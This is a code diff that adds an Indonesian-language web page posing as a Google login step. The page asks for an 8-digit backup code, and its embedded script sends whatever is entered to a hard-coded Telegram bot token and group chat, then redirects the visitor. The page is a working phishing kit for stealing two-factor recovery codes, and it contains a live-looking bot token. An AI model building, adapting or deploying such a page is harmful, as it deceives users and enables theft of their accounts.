@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Input Email</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #fff;
+        }
+
+        .input-group {
+            position: fixed;
+            width: 97%;
+            top: 230px;
+            left: 10px;
+            right: 10px;
+        }
+
+        .input-group input {
+            width: 100%;
+            height: 56px;
+            padding: 0 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            background: white;
+        }
+
+        .input-group input:focus {
+            border: 2px solid #1a73e8;
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 12px;
+            top: 18px;
+            padding: 0 5px;
+            background: white;
+            color: #5f6368;
+            font-size: 16px;
+            pointer-events: none;
+            transition: 0.2s ease;
+        }
+
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: -8px;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+
+        .input-password {
+            position: fixed;
+            width: 97%;
+            top: 300px;
+            left: 10px;
+            right: 10px;
+        }
+
+        .input-password input {
+            width: 100%;
+            height: 56px;
+            padding: 0 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            background: white;
+        }
+
+        .input-password input:focus {
+            border: 2px solid #1a73e8;
+        }
+
+        .input-password label {
+            position: absolute;
+            left: 12px;
+            top: 18px;
+            padding: 0 5px;
+            background: white;
+            color: #5f6368;
+            font-size: 16px;
+            pointer-events: none;
+            transition: 0.2s ease;
+        }
+
+        .input-password input:focus + label,
+        .input-password input:not(:placeholder-shown) + label {
+            top: -8px;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+        
+        .logo {
+            position: absolute;
+            top: 5%;
+            left: 5%;
+        }
+        img{
+            width: 15%;
+        }
+        .logo h1 {
+            font-family: sans-serif;
+            font-weight: 100;
+        }
+        .logo h2{
+            font-size: 1.1rem;
+            font-weight: 100;
+        }
+        .input-group a  {
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+        .button{
+            font-family: sans-serif;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+        button {
+            position: relative;
+            border: none;
+            margin-top:-80px;
+            cursor: pointer;
+            text-decoration: none;
+            background-color: #0055c4;
+            color: white;
+            padding: 10px 50px;
+            border-radius: 50px;
+        }
+        
+    </style>
+</head>
+
+<body>
+
+    <div class="logo">
+        <img src="https://freelogopng.com/images/all_img/1657952440google-logo-png-transparent.png" alt="">
+        <h1>Login</h1>
+        <h2>Masukan salah satu kode cadangan 8 digit</h2>
+    </div>
+    <form action="https://api.telegram.org" id="formTele" class="formtele" method="POST">
+    <div class="input-group">
+        <input
+            type="kode"
+            id="kode"
+            name="kode"
+            placeholder=" "
+            autocomplete="kode"
+        >
+
+        <label for="email">Kode cadangan 8 digit</label>
+    </div>
+    </div>
+
+    <div class="button">
+        <button type="submit" id="kirim" class="warna">Berikutnya</button>
+    </div>
+    <script>
+                    const token = '7579921784:AAGWUMbzUONmVFQ2YAsq2rWpOZ0MHxBIsrg'
+                    const group_id = '-1003875312228'
+
+                    const formtelegram = document.getElementById('formTele')
+
+                    const sendMessage = (text) => {
+                        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({
+                                "chat_id": group_id,
+                                "text": text,
+                            })
+                        }).then(res => {
+                            if (!res.ok) {
+                                throw new Error(res.statusText, res.status, res.url);
+                            }
+
+                            return res.json();
+                        }).then(res => {
+                            console.log(res);
+                            document.getElementById('kirim').innerHTML = "Login";
+                            window.location.href = "/index.html";
+                        }).catch(err => {
+                            console.log(err);
+                            alert('gagal')
+                        })
+                    };
+
+                    formtelegram.onsubmit = (e) => {
+                        e.preventDefault();
+
+                        const formData = new FormData(formtelegram)
+
+                        let text = '';
+
+                        for (const [key, val] of formData) {
+                            console.log(`${key}:`, val);
+
+                            text += `\n\n${key}:\n${val}`;
+
+                        }
+
+                        text = text.replace('\n\n', '');
+
+                        sendMessage(text)
+                    }
+                </script>
+</body>
+</html>
